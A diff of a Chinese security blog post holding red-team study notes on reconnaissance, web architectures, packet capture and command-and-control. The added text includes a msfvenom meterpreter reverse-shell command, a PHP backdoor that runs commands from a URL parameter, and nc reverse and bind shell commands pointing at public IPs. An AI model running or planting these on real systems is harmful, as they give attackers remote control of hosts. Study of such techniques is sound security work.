@@ -7,13 +7,15 @@
 <meta name="full-screen" content="yes">
 <meta name="theme-color" content="#317EFB" />
 <meta content="width=device-width, initial-scale=1.0, maximum-scale=5.0, user-scalable=0" name="viewport">
+<meta name="description" content="抓包 哈希hash 端口扫描 子域名收集 爬虫  IP和网站例子：✅192.0.2.1example.comhttp:&#x2F;&#x2F;example.com 渗透目标：域名（www.baidu.com）：www.baidu.comIP（47.86.104.150）：47.86.104.150 主站（www.baidu.com）：分站（tieba.baidu.com）：端口站（www.baidu.com:44">
 <meta property="og:type" content="article">
 <meta property="og:title" content="红队（建设中）">
 <meta property="og:url" content="https://cyphersun.github.io/2077/07/07/#%E7%BA%A2%E9%98%9F/index.html">
 <meta property="og:site_name" content="CypherSun">
+<meta property="og:description" content="抓包 哈希hash 端口扫描 子域名收集 爬虫  IP和网站例子：✅192.0.2.1example.comhttp:&#x2F;&#x2F;example.com 渗透目标：域名（www.baidu.com）：www.baidu.comIP（47.86.104.150）：47.86.104.150 主站（www.baidu.com）：分站（tieba.baidu.com）：端口站（www.baidu.com:44">
 <meta property="og:locale">
 <meta property="article:published_time" content="2077-07-06T23:07:07.000Z">
-<meta property="article:modified_time" content="2025-09-15T07:54:44.255Z">
+<meta property="article:modified_time" content="2025-09-15T10:16:30.872Z">
 <meta property="article:author" content="CypherSun">
 <meta name="twitter:card" content="summary">
 
@@ -55,7 +57,7 @@
 
 <!-- Variable -->
 <script>window.ASYNC_CONFIG = {"hostname":"cyphersun.github.io","author":"CypherSun","root":"/","typed_text":["a cybersecurity engineer"],"theme_version":"2.2.6","theme":{"switch":true,"default":"style-light"},"favicon":{"logo":null,"icon16":null,"icon32":"favicon.ico","apple_touch_icon":null,"webmanifest":null,"visibilitychange":true,"hidden":"favicon.ico","show_text":"(/≧▽≦/)咦！又好了！","hide_text":"(●—●)喔哟，崩溃啦！","appleTouchIcon":null,"showText":"骗你的~ (￣▽￣)ノ","hideText":"崩溃啦！(╯‵□′)╯︵┻━┻"},"i18n":{"placeholder":"搜索文章...","empty":"找不到您查询的内容: ${query}","hits":"找到 ${hits} 条结果","hits_time":"找到 ${hits} 条结果（用时 ${time} 毫秒）","author":"本文作者：","copyright_link":"本文链接：","copyright_license_title":"版权声明：","copyright_license_content":"本博客所有文章除特别声明外，均默认采用 undefined 许可协议。","copy_success":"复制成功","copy_failure":"复制失败","open_read_mode":"进入阅读模式","exit_read_mode":"退出阅读模式","notice_outdate_message":"距离上次更新已经 undefined 天了, 文章内容可能已经过时。","sticky":"置顶","just":"刚刚","min":"分钟前","hour":"小时前","day":"天前","month":"个月前"},"swup":true,"plugin":{"flickr_justified_gallery":"https://unpkg.com/flickr-justified-gallery@latest/dist/fjGallery.min.js"},"icons":{"sun":"far fa-sun","moon":"far fa-moon","play":"fas fa-play","email":"far fa-envelope","next":"fas fa-arrow-right","calendar":"far fa-calendar-alt","clock":"far fa-clock","user":"far fa-user","back_top":"fas fa-arrow-up","close":"fas fa-times","search":"fas fa-search","reward":"fas fa-hand-holding-usd","toc_tag":"fas fa-th-list","read":"fas fa-book-reader","arrows":"fas fa-arrows-alt-h","double_arrows":"fas fa-angle-double-down","copy":"fas fa-copy","user_tag":"fas fa-user-alt"},"icontype":"font","highlight":{"plugin":"highlighjs","theme":true,"copy":true,"lang":true,"title":"default","height_limit":"200px"},"toc":{"post_title":true},"live_time":{"start_time":"03/09/2024 15:46:00","prefix":"博客已萌萌哒运行 undefined 天"},"danmu":{"enable":false,"el":".trm-banner"},"search":{"enable":true,"type":"local","href":"https://www.google.com/search?q=site:","domain":null,"path":"search.json"}};</script>
-<script id="async-page-config">window.PAGE_CONFIG = {"isPost":true,"isHome":false,"postUpdate":"2025-09-15 15:54:44"};</script>
+<script id="async-page-config">window.PAGE_CONFIG = {"isPost":true,"isHome":false,"postUpdate":"2025-09-15 18:16:30"};</script>
 
 <!-- Theme mode css -->
 <link data-swup-theme rel="stylesheet" href="/css/index.css?v=2.2.6" id="trm-switch-style">
@@ -376,7 +378,211 @@
 </div>
 <div class="trm-card ">
     <article id="article-container" class="trm-publication">
-    
+    <ul>
+<li>抓包</li>
+<li>哈希hash</li>
+<li>端口扫描</li>
+<li>子域名收集</li>
+<li>爬虫</li>
+</ul>
+<p>IP和网站例子：✅<br>192.0.2.1<br>example.com<br><a target="_blank" rel="noopener" href="http://example.com/">http://example.com</a></p>
+<h2 id="渗透目标："><a href="#渗透目标：" class="headerlink" title="渗透目标："></a>渗透目标：</h2><p>域名（<a href="http://www.baidu.com）：www.baidu.com">www.baidu.com）：www.baidu.com</a><br>IP（47.86.104.150）：47.86.104.150</p>
+<p>主站（<a href="http://www.baidu.com）：">www.baidu.com）：</a><br>分站（tieba.baidu.com）：<br>端口站（<a href="http://www.baidu.com:443）：">www.baidu.com:443）：</a><br>目录站（<a target="_blank" rel="noopener" href="http://www.baidu.com/bbs/%EF%BC%89%EF%BC%9A">www.baidu.com/bbs/）：</a><br>子域名站（123.tieba.baidu.com）：</p>
+<p>Web架构（前后端分离，集成软件，自主环境）：<br>系统（Windows，Linux，MacOS）：<br>容器（Docker，K8s，Vmware）：<br>中间件（Apache，Nginx，Tomcat）：<br>语言（PHP，Java，Python）：<br>开发框架（Thinkphp，Laravel，YII）：</p>
+<p>数据库（MYSQL，SqlServer，SQLite）：<br>本地&#x2F;分离&#x2F;云数据库：</p>
+<p>开源&#x2F;闭源&#x2F;加密：<br>开源：后台目录，文件目录，逻辑目录，前端目录，数据目录，配置文件</p>
+<p>漏洞：</p>
+<h2 id="侦察（Reconnaissance）"><a href="#侦察（Reconnaissance）" class="headerlink" title="侦察（Reconnaissance）"></a>侦察（Reconnaissance）</h2><p>重要！！！<a target="_blank" rel="noopener" href="https://github.com/cipher387/Advanced-search-operators-list">高级搜索大全</a><br>重要！！！<a target="_blank" rel="noopener" href="https://www.yuque.com/u25571586/dyaqbugs#">2024HW漏洞库</a> 密码：xnzx</p>
+<p>漏洞CVE：<br>国家漏洞数据库(NVD) <a target="_blank" rel="noopener" href="https://nvd.nist.gov/">https://nvd.nist.gov/</a><br>CVE <a target="_blank" rel="noopener" href="https://www.cve.org/">https://www.cve.org/</a><br>浏览器</p>
+<p>操作系统：<br>Linux手册页 <a target="_blank" rel="noopener" href="https://linux.die.net/man/8/ip">https://linux.die.net/man/8/ip</a><br>微软技术文档<a target="_blank" rel="noopener" href="https://learn.microsoft.com/">https://learn.microsoft.com/</a><br>其他官方文档</p>
+<p>检测恶意：<br>VirusTotal <a target="_blank" rel="noopener" href="https://www.virustotal.com/">https://www.virustotal.com/</a><br>Have I Been Pwned <a target="_blank" rel="noopener" href="https://haveibeenpwned.com/">https://haveibeenpwned.com/</a></p>
+<p><a target="_blank" rel="noopener" href="https://cybdetective.com/">https://cybdetective.com/</a> 不错，可以探索探索</p>
+<p>开源，检查源码目录结构（后台目录，文件目录，逻辑目录，前端目录，数据目录，配置文件）：</p>
+<p>目录扫描：<br>工具：dirb,</p>
+<p>端口扫描：</p>
+<p>云数据库白名单解决：<br>1.上传数据库连接脚本，访问脚本连接数据库<br>2.上传流量代理工具，数据中转操作连接数据库</p>
+<p>检查页面源代码</p>
+<p>简单密码 admin，administrator，root</p>
+<p>Ping<br>nslookup<br>whois</p>
+<p><a href="https://cyphersun.github.io/2025/05/01/Gobuster/">Gobuster</a><br>扫描 URL 目录和文件，获取隐藏 URL</p>
+<p>Web 服务器上的虚拟主机名，打开 Amazon S3 存储桶，Google Cloud 存储桶，TFTP 服务器</p>
+<p>dirb + 默认单词表<br>dirb <a target="_blank" rel="noopener" href="http://example.com/">http://example.com</a></p>
+<p>nmap<br>-sS 隐蔽扫描<br>-sV 探测服务器版本<br>–script vuln 探测漏洞版本</p>
+<p>nmap -sV –script vuln TARGET_IP</p>
+<p>检查用户名，电子邮件是否存在：<br>登录尝试：通过故意输入错误的用户名或密码，触发错误消息，从而帮助区分有效和无效的用户名。“此帐户不存在”，“密码错误”<br>注册尝试：“用户名已被占用”，“电子邮件地址已被占用”<br>密码重置：“此帐户不存在”，“密码错误”</p>
+<p>数据泄露，账户和密码是否不同平台上重复使用</p>
+<h1 id="Web-架构："><a href="#Web-架构：" class="headerlink" title="Web 架构："></a>Web 架构：</h1><p>1、套用模版型，csdn &#x2F; cnblog &#x2F; github &#x2F; 建站系统等<br>安全测试思路上的不同：一般以模版套用，基本模版无漏洞，大部分都采用测试用户管理权限为主</p>
+<p>2、前后端分离<br>安全测试思路上的不同：前端以JS（Vue,NodeJS等）安全问题，主要以API接口测试，前端漏洞（如XSS）为主，后端隐蔽难度加大。</p>
+<p>3、集成软件包宝塔，Phpstudy，xamp等<br>安全测试思路上的不同：主要是防护体系，权限差异为主，有些集成软件自身设置了高权限管理，有些没有<br>宝塔命令执行不行，文件管理除了web都能看，其他都不让看<br>绕过宝塔限制</p>
+<p>4、自主环境镜像，云镜像打包，自行一个个搭建<br>安全测试思路上的不同：主要是防护体系，权限差异为主<br>命令执行可以，文件管理基本都能看 除去一些高权限目录（root目录等），或者可能人工设置<br>横向提权</p>
+<p>5、容器拉取镜像，Docker<br>安全测试思路上的不同：虚拟化技术，在后期测试要进程逃逸提权<br>内置的虚拟化技术，单独的磁盘空间给应用做支撑<br>Docker 进程逃逸提权</p>
+<p>6、纯静态页面，纯HTML+CSS+JS的设计<br>安全测试思路上的不同：无后期讲到的Web漏洞<br>搜搜相关找其他线索：找域名，资产，客户端等</p>
+<h1 id="CDN"><a href="#CDN" class="headerlink" title="CDN"></a>CDN</h1><p>原理：内容分发服务，旨在提高访问速度<br>影响：隐藏真实源IP，导致对目标IP测试错误<br>站长工具ping可以检测，多个IP的就是CDN</p>
+<h1 id="OSS"><a href="#OSS" class="headerlink" title="OSS"></a>OSS</h1><p>原理：云存储服务，旨在提高访问速度<br>Cloudreve <a target="_blank" rel="noopener" href="https://github.com/cloudreve/Cloudreve/releases/tag/3.7.1">https://github.com/cloudreve/Cloudreve/releases/tag/3.7.1</a></p>
+<p>原理：<br>为什么要使用第三方存储？<br>1）静态文件会占用大量带宽<br>2）加载速度<br>3）存储空间<br>影响：<br>上传的文件或解析的文件均来自于OSS资源，无法解析，单独存储<br>1、修复上传安全<br>2、文件解析不一样<br>3、但存在AK&#x2F;SK隐患</p>
+<h1 id="正向代理"><a href="#正向代理" class="headerlink" title="正向代理"></a>正向代理</h1><p>原理：正向代理帮客户端访问无法直接访问的资源，客户端知道代理的存在并主动配置<br>影响：目标服务器不知道真实的客户端是谁，只能看到代理服务器的 IP<br>主要用于突破访问限制、保护客户端隐私等<br>例如VPN</p>
+<p>反向代理<br>原理：反向代理帮助服务器接收和处理客户端请求<br>影响：访问目标只是一个代理，非真实应用服务器，隐藏了真实服务器的信息<br>访问热门网站时，很可能在与反向代理打交道，而不是直接访问真实的服务器<br>客户端不知道反向代理的存在，以为自己在直接访问目标服务器<br>例如负载均衡等</p>
+<p>注意：正向代理和反向代理都是解决访问不可达的问题，但由于反向代理中多出一个可以重定向解析的功能操作，导致反代理出的站点指向和真实应用毫无关系！</p>
+<p>可以设置反向代理请求&#x2F;bil到biliblil上，请求&#x2F;bai到baidu上，就像中介一样</p>
+<h1 id="负载均衡"><a href="#负载均衡" class="headerlink" title="负载均衡"></a>负载均衡</h1><p>原理：分摊到多个操作单元上进行执行，共同完成工作任务<br>影响：有多个服务器加载服务，测试过程中存在多个目标情况<br>站长工具ping可以检测，只有几个IP的就是负载均衡</p>
+<h1 id="蜜罐"><a href="#蜜罐" class="headerlink" title="蜜罐"></a>蜜罐</h1><p>有害影响：用来钓鱼或诱惑测试人员的防护系统<br>可以分析攻击者身份，浪费攻击者时间</p>
+<h1 id="堡垒机"><a href="#堡垒机" class="headerlink" title="堡垒机"></a>堡垒机</h1><p>有利影响：Web应用或其他应用提供给测试人员一个能获取到价值信息的系统，防护产品也可能成为漏洞目标</p>
+<h1 id="API接口"><a href="#API接口" class="headerlink" title="API接口"></a>API接口</h1><p>​​API 就是软件之间的“服务员”​​，帮你传话、跑腿、拿数据。API 的价值就是：让别人（比如顺丰）的功能，变成你的功能<br>能够获取目标网站一个查询的地方，</p>
+<p>1、Web API:<br>通过HTTP协议进行通信的API，常用于Web服务和应用程序<br>例如，RESTful API、GraphQL API。</p>
+<p>2、库和框架API:<br>提供特定编程语言或框架功能的API，供开发者在应用程序中使用<br>例如，Java API、Python标准库。</p>
+<p>3、操作系统API:<br>提供操作系统功能访问的API<br>例如，Windows API、POSIX API</p>
+<p>4、远程API:<br>允许在网络上远程访问服务的API<br>例如，SOAP API、XML-RPC API</p>
+<p>内部API（公司内部用）​​<br>​​例子​​：<br>​​美团骑手​​调用​​美团APP订单系统​​的API（获取配送信息）<br>​​特点​​：不对外开放，只有美团自己的系统能用。</p>
+<p>外部API（开放给所有人或合作伙伴）​​<br>​​例子​​：<br>​​美团APP​​ 调用​​微信支付API​​（微信付钱）<br>​​特点​​：任何人都可以申请使用（但可能需要付费或认证）。</p>
+<p>有利影响：<br>内部API：Web应用提供给测试人员一个能获取到价值信息的接口，开尝试枚举其他隐藏API，例如账户等<br>外部API：可以借助提供的API获取到当前网站不想让你获取的信息，开尝试枚举其他隐藏API，例如账户等</p>
+<p>分析API的目录结构、接口命名规则、参数命名规则、功能和业务逻辑等，<br>根据这些信息可以进行接口枚举和参数枚举，进而可以进行相关的漏洞测试<br>可能API抓包，分析js</p>
+<p>拓展应用：防火墙 消息队列 分布式等<br>ActiveMQ Redis Memcache Jenkins等漏洞<br><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/SEjxrUgiIIK2bveSBz6mTg">https://mp.weixin.qq.com/s/SEjxrUgiIIK2bveSBz6mTg</a><br>有利影响：搭建越多应用即方便了运维也提供给测试人员更多机会</p>
+<h1 id="APP应用开发架构："><a href="#APP应用开发架构：" class="headerlink" title="APP应用开发架构："></a>APP应用开发架构：</h1><p>1、原生开发<br>安卓一般使用java语言开发，也有kotlin语言开发。使用安卓提供的一系列控件来实现页面，复杂点的页面可以通过自定义控件来实现<br>2、使用H5语言开发<br>使用H5开发的好处有很多，可多端复用，比如浏览器端，ios端，H5开发的体验是没有原生好的。一般页面需要分享出去的话，就用H5开发<br>3、使用flutter开发<br>flutter是谷歌推出的UI框架，使用dart语言进行开发，支持跨平台，weight渲染直接操作硬件层，体验可媲美原生。flutter技术比较新，生态还不完善，开发起来效率相对偏低。<br>4、常规Web开发<br>Web App软件开发就是开发一个网站，然后加入app的壳。Web App一般非常小，内容都是app内的网页展示，受制于网页技术本身，可实现功能少，而且每次打开，几乎所有的内容都需要重新加载，所以反应速度慢，内容加载过多就容易卡死，用户体验差，而且app内的交互设计等非常有效。但开发周期长端，需要的技术人员少，成本低。</p>
+<p>APP-原生态-IDEA<br>工具：NP管理器，HttpCanary<br>安全影响：反编译&amp;流量抓包&amp;常规测试，逆向的角度去分析逻辑设计安全<br>涉及到网站，接口就抓包能抓到web相关的</p>
+<p>APP-Web封装-封装平台<br>工具：多豆云打包<br>安全影响：常规Web安全测试即可，就是web伪装的app而已</p>
+<p>APP-HTML5&amp;Vue-HBuilderX<br>工具：HBuilderX<br>安全影响：API&amp;JS框架安全问题&amp;JS前端测试</p>
+<h1 id="小程序开发架构："><a href="#小程序开发架构：" class="headerlink" title="小程序开发架构："></a>小程序开发架构：</h1><p>除了微信小程序外，还有支付宝、百度、头条、飞书、QQ、快手、钉钉、淘宝等个各种平台的小程序。<br>微信小程序开发，根据自身情况和项目需要，选择不同的开发方式，包括：原生开发、WebView开发、框架开发和低代码开发等。<br>参考：<a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/dXTb0wk57-bLA3tUuvOFSw">https://mp.weixin.qq.com/s/dXTb0wk57-bLA3tUuvOFSw</a></p>
+<p>WX小程序-Web封装-平台<br>工具：多豆云打包<br>安全影响：常规Web安全测试</p>
+<p>WX小程序-H5&amp;Vue-HBuilderX<br>工具：HBuilderX + 微信开发者工具<br>安全影响：API&amp;JS框架安全问题&amp;前端测试，文件名以wxml结尾</p>
+<p>反编译小程序-提取小程序源码泄漏的信息<br>1、反编译-源码-提取资产（泄漏的配置信息）-安全测试<br>2、抓包-资产-安全测试</p>
+<h1 id="抓包"><a href="#抓包" class="headerlink" title="抓包"></a>抓包</h1><p>准备工作：<br>1、浏览器安装证书：解决本地抓HTTPS<br>2、模拟器安装证书：解决模拟器抓HTTPS<br>3、真机器安装证书：解决真机器抓HTTPS<br>注：本地装证书一定要装在受信任和中间两个选项里面</p>
+<p>代理抓包<br>Fiddler<br>Charles<br>BurpSuite<br>Reqable<br>Yakit<br>Proxifier</p>
+<p>全局抓包<br>科来网络分析系统<br>WireShark</p>
+<p>PC端应用<br>1、有代理设置走代理设置<br>2、没有代理设置走联动转发</p>
+<p>模拟器APP抓包<br>1、无防护-模拟器直接抓包<br>2、有防护-真机绕过&amp;更改内核<br>3、有防护-证书绕过&amp;代理绕过<br>注意：真机抓包要保证手机和电脑在同一网络</p>
+<h1 id="抓包工具联动"><a href="#抓包工具联动" class="headerlink" title="抓包工具联动"></a>抓包工具联动</h1><p>意义：让一个数据包同时经过不同安全测试工具进行扫描</p>
+<p>Burp转发Yakit<br>Yakit转发Burp<br>Burp转发Yakit转发Reqable</p>
+<h1 id="科学上网抓包"><a href="#科学上网抓包" class="headerlink" title="科学上网抓包"></a>科学上网抓包</h1><p>Clash+Burp<br>Clash+Yakit<br>解决：<br>1、目标需要采用梯子才能访问<br>2、IP隐藏去访问并要进行抓包</p>
+<h1 id="全局协议抓包"><a href="#全局协议抓包" class="headerlink" title="全局协议抓包"></a>全局协议抓包</h1><p>WireShark<br>科来网络系统<br>1、解决部分代理校验<br>有部分的app web 小程序 当设置了代理后无法抓包<br>校验：检测到了当前机器的代理设置 做了一个策略防止抓包<br>做了代理的设置数据走向：应用-&gt;代理-&gt;给到监听抓包工具-&gt;网卡<br>没有做代理的数据走向：应用-&gt;网卡抓包-&gt;服务器 代理是在网卡之前产生</p>
+<p>2、APP&#x2F;小程序&#x2F;PC应用<br>由于应用类型不同，不是说所有的应用都有https协议的数据，就需要全局抓包<br>安卓模拟器在WIFI里面设置代理可能会检测到，但是如果不在里面设置，在外面使用Proxifier就检测不到了</p>
+<p>3、蓝队分析TCP&#x2F;UDP应用<br>想要虚拟机控制本机必须开桥接模式<br>msfvenom -p windows&#x2F;meterpreter&#x2F;reverse_tcp lhost&#x3D;192.0.2.1 lport&#x3D;6666 -f exe -o 9.exe</p>
+<br>
+
+
+
+
+
+<h2 id="武器化（Weaponization）"><a href="#武器化（Weaponization）" class="headerlink" title="武器化（Weaponization）"></a>武器化（Weaponization）</h2><p>WAF简单可以绕过，难的一般可以跑路了</p>
+<p>WAF<br>原理：Web应用防火墙，旨在提供保护<br>影响：常规Web安全测试手段会受到拦截</p>
+<p>漏洞利用数据库 <a target="_blank" rel="noopener" href="https://www.exploit-db.com/">https://www.exploit-db.com/</a></p>
+<br>
+
+
+
+
+
+<h2 id="投送（Delivery）"><a href="#投送（Delivery）" class="headerlink" title="投送（Delivery）"></a>投送（Delivery）</h2><p>URL路由&amp;绝对相对路径&amp;格式权限<br>1、URL路由：URL访问对应文件，MVC模型等<br>2、相对绝对：相对当前目录，完整的目录路径<br>3、格式权限：后门解析格式，代码正常执行，脚本执行权限等</p>
+<p>xxx.xiaodi8.com&#x2F;admin&#x2F;login.php  &#x3D;  源码&#x2F;admin&#x2F;login.php</p>
+<p>框架开发 MVC（model view controller）模型源码 ： 根据框架的路由决定</p>
+<p>xxx.xiaodi8.com&#x2F;admin&#x2F;login   ≠ 源码&#x2F;admin&#x2F;login</p>
+<p>代码审计时 区分MVC和非MVC模型的源码</p>
+<p>Web源码形式：<br>旨在了解源码差异，后期代码审计和测试中对源码真实性的判断<br>1、单纯简易源码<br>一对一对应的，xxxx.com&#x2F;admin</p>
+<p>2、MVC框架源码，了解url对应文件，文件对应url<br>看路由关系访问的，xxxx.com&#x2F;index&#x2F;admin</p>
+<p>3、编译调用源   码<br>如：NET-DLL封装 Java-Jar打包</p>
+<p>4、前后端分离源码<br><a target="_blank" rel="noopener" href="https://segmentfault.com/a/1190000045026063">https://segmentfault.com/a/1190000045026063</a><br>前端nodejs vue等（js开发框架）<br>后端php java python等</p>
+<p>5、加密型源码<br>如：通达OA源码</p>
+<br>
+
+
+
+
+
+<h2 id="利用（Exploitation）"><a href="#利用（Exploitation）" class="headerlink" title="利用（Exploitation）"></a>利用（Exploitation）</h2><p>密钥暴露的常见情况</p>
+<ol>
+<li><p>JavaScript 中的硬编码API<br>密钥开发人员经常为了方便而将API密钥嵌入前端代码中，却忘记了任何人都可以使用浏览器开发人员工具查看此代码。</p>
+</li>
+<li><p>客户端框架中的加密密钥<br>加密密钥有时会包含在前端库或脚本中，用于本地加密&#x2F;解密数据。这些密钥很容易被提取并被恶意使用。</p>
+</li>
+<li><p>不安全的配置文件<br>嵌入在 Web 应用程序中的配置文件可能包含纯文本的敏感凭据或密钥。</p>
+</li>
+<li><p>暴力破解密钥：<br>弱密钥或可预测密钥（例如从时间戳或短字母数字字符串派生的密钥）可以通过使用 Hashcat 或John the Ripper等工具的暴力攻击来破解。</p>
+</li>
+<li><p>破解哈希：<br>MD5和 SHA-1等过时的哈希函数容易受到碰撞和原像攻击等攻击。<br>缺乏加盐使得攻击者能够使用彩虹表将哈希反转为纯文本。</p>
+</li>
+<li><p>客户端代码中暴露的键：<br>前端代码中的硬编码加密密钥或API机密会将其暴露给任何有权访问该应用程序的人。<br>这使得攻击者可以解密敏感数据或冒充用户。</p>
+</li>
+<li><p>位翻转攻击：<br>未经身份验证的加密（例如，没有 MAC 的AES -CBC）使攻击者能够修改密文，从而对解密的明文进行可控的更改。</p>
+</li>
+</ol>
+<p>尝试在代码中加点感叹号利用发现新漏发<br>例如，mother link漏洞 CVE-2024-21413</p>
+<p>常用密码，姓名+生日</p>
+<p>_、^这种符号出现，应该联想到ASCII码<br>&#x3D;后跟随俩0-9或A-F十六进制数字，应该联想到Quoted-printable编码<br>凯撒意味着固定移动几位，变异凯撒意味着不是固定移动了，可能是有规律移动</p>
+<p>python脚本<br>ord()函数将字符转换为其对应的ASCII码值<br>chr() - 将ASCII码值转换回对应的字符</p>
+<br>
+
+
+
+
+
+<h2 id="安装（Installation）"><a href="#安装（Installation）" class="headerlink" title="安装（Installation）"></a>安装（Installation）</h2><br>
+
+
+
+
+
+<h2 id="命令与控制（Command-and-Control，C2）"><a href="#命令与控制（Command-and-Control，C2）" class="headerlink" title="命令与控制（Command and Control，C2）"></a>命令与控制（Command and Control，C2）</h2><p>反弹Shell的前提条件:<br>已知存在的漏洞利用或执行命令的地方</p>
+<p>为什么要反弹Shell?<br>往往由于很多因素如：防火墙的开启限制，端口被占用，无法进行正向连接，数据不回显，攻击者可能无法直接从受攻击系统上建立连接并获取Shell控制权时。<br>例子：</p>
+<ol>
+<li>远程控制：通过反弹shell，攻击者可以远程控制目标系统，执行各种命令和操作，获得对目标系统的完全控制权限。</li>
+<li>隐藏攻击痕迹：通过反弹shell，攻击者可以在目标系统上执行命令，而不需要直接与。这样可以减少被发现的风险，同时也可以更好地隐藏攻击者的身份和攻击行为。</li>
+<li>横向渗透：一旦攻击者成功反弹shell并获得目标系统的访问权限，他们可以进一步横向渗透，即在网络中移动并攻击其他系统，以获取更多的敏感信息或控制权。</li>
+<li>数据盗取和系统破坏：通过反弹shell，攻击者可以获取目标系统上的敏感数据，并且可以操纵系统以造成损害，例如删除文件、破坏系统配置等。</li>
+</ol>
+<p>#反弹Shell<br>在线生成：<br><a target="_blank" rel="noopener" href="https://sec.lintstar.top/">反弹Shell生成</a><br>[反弹Shell生成]<a target="_blank" rel="noopener" href="https://www.revshells.com/">https://www.revshells.com/</a><br>[反弹Shell生成]<a target="_blank" rel="noopener" href="https://forum.ywhack.com/shell.php">https://forum.ywhack.com/shell.php</a></p>
+<p>命令类别：<br>1、开发语言：系统环境变量开发环境<br>2、系统自带：系统支持的系统命令调用<br>3、第三方项目：利用远程下载命令后调用<br>4、正反向类别：Reverse(反向) Bind绑定(正向)等</p>
+<p>Windows&lt;–&gt;Linux<br>总结：<br>1、Windows上基本就PowerShell命令可以反弹，再就是环境变量的开发语言<br>2、Linux上默认自带的nc(ncat)，系统命令，开发语言等基本大部分都可反弹</p>
+<p>#渗透命令<br>在线参考：<br><a target="_blank" rel="noopener" href="https://book.shentoushi.top/">https://book.shentoushi.top/</a><br>文件下载：<br><a target="_blank" rel="noopener" href="https://forum.ywhack.com/bountytips.php?download">https://forum.ywhack.com/bountytips.php?download</a></p>
+<h3 id="数据不回显-原因解决-反弹-带外-延迟-写文件"><a href="#数据不回显-原因解决-反弹-带外-延迟-写文件" class="headerlink" title="数据不回显-原因解决-反弹&amp;带外&amp;延迟&amp;写文件"></a>数据不回显-原因解决-反弹&amp;带外&amp;延迟&amp;写文件</h3><p>原因：代码层面函数调用问题，没有输出测试等<br>过程：<br>1、判断是否有漏洞！！是不是数据不回显<br>2、有漏洞，然后如何把执行的数据获取到</p>
+<p>创建rce.php后门文件<br><?php
+shell_exec($_GET['c']);
+system($_GET['c']);
+?></p>
+<p>访问链接<br>192.0.2.1&#x2F;rce.php?c&#x3D;ipconfig</p>
+<p>解决：</p>
+<ol>
+<li><p>反弹shell权限<br>判定目标的操作系统<br><a target="_blank" rel="noopener" href="https://forum.ywhack.com/shell.php">https://forum.ywhack.com/shell.php</a><br><a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/1906240">反弹shell的技巧总结</a><br>nc -e cmd 119.45.254.149 7777<br>nc -lvp 7777</p>
+</li>
+<li><p>Yakit数据带外<br>DNSlog<br>TCP-Portlog<br>ICMP-Sizelog</p>
+</li>
+<li><p>延迟判断<br>发包然后抓包看回显时间，浏览器F12—网络也可以看，加大次数，看回显的时间<br>Win：ping -n 3&#x2F;6&#x2F;10+ 127.0.0.1<br>Linux：ping -c 3&#x2F;6&#x2F;10+ 127.0.0.1</p>
+</li>
+<li><p>写访问文件<br><a target="_blank" rel="noopener" href="http://8.217.55.197/?c=echo">http://8.217.55.197/?c=echo</a> 123 &gt; 1.txt<br>再去访问 <a target="_blank" rel="noopener" href="http://8.217.55.197/1.txt%EF%BC%8C%E6%9F%A5%E7%9C%8B%E6%98%AF%E5%90%A6%E8%83%BD%E6%88%90%E5%8A%9F%E6%89%A7%E8%A1%8C">http://8.217.55.197/1.txt，查看是否能成功执行</a><br>写静态文件或写入可访问的文件确定</p>
+</li>
+<li><p>其他：根据环境<br>文件下载等（反连的意义）通过棱角生成Windows或者linux下载命令</p>
+</li>
+</ol>
+<h3 id="数据不出网-原因解决-正反连接-出入站策略-隧道"><a href="#数据不出网-原因解决-正反连接-出入站策略-隧道" class="headerlink" title="数据不出网-原因解决-正反连接&amp;出入站策略&amp;隧道"></a>数据不出网-原因解决-正反连接&amp;出入站策略&amp;隧道</h3><p>环境：<br>Windows外网靶机 Linux外网攻击机<br>Windows内网靶机 Linux内网攻击机</p>
+<p>流程：<br>1、判断出入站策略限制<br>2、判断出入站策略限制的端口和协议<br>3、分析原因用正向还是反向还是ICMP等隧道</p>
+<p>原因：主机或应用防火墙出站限制<br>解决：利用NC反弹实验<br>1、正向连接<br>2、反向连接<br>3、隧道技术<br>相对于靶机角度</p>
+<ol>
+<li>目标机器有<strong>入站策略</strong>只允许特定端口连接，可以采用反向连接<br>反向连接：目标机器主动给出去，攻击机来监听</li>
+</ol>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 目标机器绑定自己CMD到攻击机IP的6666端口</span></span><br><span class="line">nc -e cmd 47.239.118.154 6666</span><br><span class="line"></span><br><span class="line"><span class="comment"># 攻击机等待6666连接</span></span><br><span class="line">nc -lvvp 6666</span><br></pre></td></tr></table></figure>
+
+
+<ol start="2">
+<li>目标机器有<strong>出站策略</strong>，不允许出去，采用正向连接<br>正向连接：本地监听等待对方连接</li>
+</ol>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 目标机器绑定CMD到自己本地6666端口</span></span><br><span class="line">nc -e cmd -lvvp 6666</span><br><span class="line"></span><br><span class="line"><span class="comment"># 攻击机主动连接目标机器6666端口</span></span><br><span class="line">nc 8.217.55.197 6666</span><br></pre></td></tr></table></figure>
+
+
+<ol start="3">
+<li>目标机器有<strong>出入站策略</strong>，采用其他协议隧道<br>ICMP，DNS等隧道技术</li>
+</ol>
+<p>站在​​攻击者​​的视角，​​“我连别人”是正向，“别人连我”是反向​​。</p>
+<p>站在​​目标机器​​的视角，​​“别人连我”是正向，“我连别人”是反向​​。</p>
+<p>由上述内容发现还需那些内容学习：<br>1、其他反弹项目使用 工具或自带命令<br>2、系统操作命令使用 文件下载<br>3、复杂内网通讯隧道</p>
+<br>
+
+
+
+
+
+<h2 id="行动目标（Actions-on-Objectives）"><a href="#行动目标（Actions-on-Objectives）" class="headerlink" title="行动目标（Actions on Objectives）"></a>行动目标（Actions on Objectives）</h2><br>
+
+
+
+
 </article>
     
     
@@ -390,7 +596,6 @@
             <span data-number="02"></span>
         </h5>
     </div>
-    
     
         <div class="col-lg-6">
     <div class="trm-blog-card trm-scroll-animation">
@@ -419,6 +624,41 @@
             <ul class="trm-card-data trm-label">
                 <li>77/07/07</li>
                 <li>07:07</li>
+                
+                
+            </ul>
+        </div>
+    </div>
+</div>
+    
+    
+        <div class="col-lg-6">
+    <div class="trm-blog-card trm-scroll-animation">
